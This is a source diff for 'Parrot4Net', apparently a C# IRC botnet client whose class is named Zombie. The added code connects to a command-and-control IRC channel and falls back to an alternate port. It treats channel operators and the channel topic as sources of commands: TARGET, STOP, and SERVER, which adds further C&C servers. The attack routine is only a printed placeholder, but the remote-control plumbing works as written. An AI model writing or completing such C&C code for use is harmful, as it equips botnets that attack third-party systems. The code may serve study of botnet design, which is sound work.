@@ -1,8 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Threading;
 using Meebey.SmartIrc4net;
 
@@ -13,9 +10,13 @@ namespace Parrot4Net
         private static IrcClient irc;
         private static bool ircenabled = true;
         private static Thread irclisten;
-        private static Dictionary<string, string> OpList;
+        private static HashSet<string> OpList;
+        private static int ircport;
+        private static int ircalterport;
+        private static string ircchannel;
+        private static SortedSet<String> serverlist = new SortedSet<string>();
 
-        public Zombie() {
+        public Zombie(string ircserver, int ircport, int ircalterport, string ircchannel) {
             irc = new IrcClient();
             irc.OnConnected += IrcConnected;
             irc.OnReadLine += OnReadLine;
@@ -32,12 +33,16 @@ namespace Parrot4Net
             irc.OnNames += OnNames;
             irc.AutoRejoinOnKick = true;
             irc.AutoRejoin = true;
+            serverlist.Add(ircserver);
+            Zombie.ircport = ircport;
+            Zombie.ircchannel = ircchannel;
+            Zombie.ircalterport = ircalterport;
         }
 
-        public void ConnectAndListen(string ircserver, int ircport, string ircchannel) {
+        public void ConnectAndListen() {
             try
             {
-                irc.Connect(ircserver, ircport);
+                irc.Connect(new List<string>(serverlist).ToArray(), ircport);
                 irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
                 irc.RfcJoin(ircchannel);
                 // Spawn a thread to handle the listen.
@@ -46,8 +51,19 @@ namespace Parrot4Net
             }
             catch (ConnectionException e)
             {
-                Console.WriteLine("couldn't connect! Reason: " + e.Message);
-                Exit();
+                try {
+                    irc.Connect(new List<string>(serverlist).ToArray(), ircalterport);
+                    irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
+                    irc.RfcJoin(ircchannel);
+                    // Spawn a thread to handle the listen.
+                    irclisten = new Thread(new ThreadStart(IrcListenThread));
+                    irclisten.Start();
+                }
+                catch
+                {
+                    Console.WriteLine("couldn't connect! Reason: " + e.Message);
+                    Exit();
+                }
             }
         }
 
@@ -56,17 +72,38 @@ namespace Parrot4Net
             Console.WriteLine("Connected...");
         }
 
+        private void IrcDisconnected(object sender, EventArgs e)
+        {
+            Console.WriteLine("Disconnected...");
+            try
+            {
+                irc.Connect(new List<string>(serverlist).ToArray(), ircport);
+                irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
+                irc.RfcJoin(ircchannel);
+            }
+            catch
+            {
+                try {
+                    irc.Connect(new List<string>(serverlist).ToArray(), ircalterport);
+                    irc.Login("HIR_" + Utils.RandomString(), "Hirata Zombie", 0, "IRCHIR");
+                    irc.RfcJoin(ircchannel);
+                }
+                catch { }
+            }
+        }
+
         private void OnReadLine(object sender, ReadLineEventArgs e)
         {
             string command = e.Line.Split(' ')[0];
+            string second = e.Line.Split(' ')[1];
             if (command.Equals("PING"))
             {
-                string server = e.Line.Split(' ')[1];
-                irc.WriteLine("PONG " + server, Priority.Critical);
+                irc.WriteLine("PONG " + second, Priority.Critical);
             }
-            else if (command.Equals("422") || command.Equals("376")) // 422: motd missing // 376: end of motd
+            else if (second.Equals("422") || second.Equals("376")) // 422: motd missing // 376: end of motd
             {
                 if (OpList != null) OpList.Clear();
+                if (OpList == null) OpList = new HashSet<string>();
             }
             else
             {
@@ -74,59 +111,128 @@ namespace Parrot4Net
             }
         }
 
-        private void OnMessage(object sender, IrcEventArgs e)
+        private void OnNames(object sender, NamesEventArgs e)
         {
-            Console.WriteLine("Got message " + e.Data.RawMessage);
+            //Got the list of everybody...
+            if (OpList != null)
+            {
+                OpList.Clear();
+            }
+            else
+            {
+                if (OpList == null) OpList = new HashSet<string>();
+            }
+
+            foreach (string user in e.UserList)
+            {
+                if (user.StartsWith("@") || user.StartsWith("&") || user.StartsWith("~"))
+                {
+                    //Add operators to our operator set.
+                    OpList.Add(user.Substring(1));
+                }
+            }
         }
 
         private void OnOp(object sender, OpEventArgs e)
         {
-            Console.WriteLine("Became operator " + e.Whom);
+            //Someone became an operator
+            if (OpList == null) OpList = new HashSet<string>();
+            if (!OpList.Contains(e.Whom))
+            {
+                //Add it if he's not already there.
+                OpList.Add(e.Whom);
+            }
         }
 
         private void OnDeOp(object sender, DeopEventArgs e)
         {
-            Console.WriteLine("Lost Operator Privilege " + e.Data.RawMessage);
+            //Someone is not an operator anymore
+            if (OpList == null) OpList = new HashSet<string>();
+            if (OpList.Contains(e.Whom))
+            {
+                //Remove him if he's there.
+                OpList.Remove(e.Whom);
+            }
         }
 
         private void OnPart(object sender, PartEventArgs e)
         {
-            Console.WriteLine("Got Part " + e.PartMessage);
-        }
-
-        private void OnNickChange(object sender, NickChangeEventArgs e)
-        {
-            Console.WriteLine("Changed Nick " + e.Data.RawMessage);
-        }
-
-        private void OnTopic(object sender, TopicEventArgs e)
-        {
-            Console.WriteLine("On Topic " + e.Data.RawMessage);
-        }
-
-        private void OnTopicChange(object sender, TopicChangeEventArgs e)
-        {
-            Console.WriteLine("On Topic Change " + e.Data.RawMessage);
+            // Same as with quit
+            if (OpList == null) OpList = new HashSet<string>();
+            if (OpList.Contains(e.Who))
+            {
+                //Remove him if he's there.
+                OpList.Remove(e.Who);
+            }
         }
 
         private void OnQuit(object sender, QuitEventArgs e)
         {
-            Console.WriteLine("Quit " + e.Data.RawMessage);
+            if (OpList == null) OpList = new HashSet<string>();
+            if (OpList.Contains(e.Who))
+            {
+                //Remove him if he's there.
+                OpList.Remove(e.Who);
+            }
         }
 
         private void OnKick(object sender, KickEventArgs e)
         {
-            Console.WriteLine("Kick " + e.Data.RawMessage);
+            // Similar to with Quit, but he WAS kicked (uses Whom)
+            if (OpList == null) OpList = new HashSet<string>();
+            if (OpList.Contains(e.Whom))
+            {
+                //Remove him if he's there.
+                OpList.Remove(e.Whom);
+            }
         }
 
-        private void IrcDisconnected(object sender, EventArgs e)
+
+        private void OnNickChange(object sender, NickChangeEventArgs e)
         {
-            Console.WriteLine("Disconnected...");
+            if (OpList != null)
+            {
+                //Keep our set up to date.
+                if (OpList.Contains(e.OldNickname))
+                {
+                    OpList.Remove(e.OldNickname);
+                }
+                if (!OpList.Contains(e.NewNickname))
+                {
+                    OpList.Add(e.NewNickname);
+                }
+            }
         }
 
-        private void OnNames(object sender, NamesEventArgs e)
+        private void OnMessage(object sender, IrcEventArgs e)
         {
-            Console.WriteLine("Names " + e.Data.RawMessage);
+            Console.WriteLine("Message: " + e.Data.Message);
+            //authenticate
+            if (OpList != null && OpList.Contains(e.Data.Nick))
+            {
+                String[] pars = e.Data.Message.Split(' ');
+                Console.WriteLine("Controlled by " + e.Data.Nick);
+                Console.WriteLine("Control command: " + e.Data.Message);
+                ParseCommand(pars);
+            }
+        }
+
+        private void OnTopic(object sender, TopicEventArgs e)
+        {
+            Console.WriteLine("TOPIC: " + e.Topic);
+            String[] pars = e.Topic.Split(' ');
+            Console.WriteLine("Controlled by Established Topic.");
+            Console.WriteLine("Control command: " + e.Topic);
+            ParseCommand(pars);
+        }
+
+        private void OnTopicChange(object sender, TopicChangeEventArgs e)
+        {
+            Console.WriteLine("NEW TOPIC: " + e.NewTopic);
+            String[] pars = e.NewTopic.Split(' ');
+            Console.WriteLine("Controlled by new Topic, set by: " + e.Who);
+            Console.WriteLine("Control command: " + e.NewTopic);
+            ParseCommand(pars);
         }
 
         private void IrcListenThread()
@@ -137,12 +243,38 @@ namespace Parrot4Net
             }
         }
 
-        public static void Exit()
+        private static void Exit()
         {
             // we are done, lets exit...
             Console.WriteLine("Exiting...");
             Environment.Exit(0);
         }
 
+        private void ParseCommand(String[] pars) {
+            string control = pars[0];
+            string value = (pars.Length>1)?(pars[1]):("");
+            switch (control) {
+                case "TARGET":
+                    if (value != "") {
+                        Attack(value);
+                    }
+                    break;
+                case "SERVER": AddServer(value);  break;
+                case "STOP": Stop();  break;
+            }
+        }
+
+        private void Attack(string target) {
+            Console.WriteLine("***************Attacking " + target + "***************");
+        }
+
+        private void Stop() {
+            Console.WriteLine("***************Stopped attacking***************");
+        }
+
+        private void AddServer(string value) {
+            serverlist.Add(value);
+            Console.WriteLine("***************Adding a new C&C***************");
+        }
     }
 }
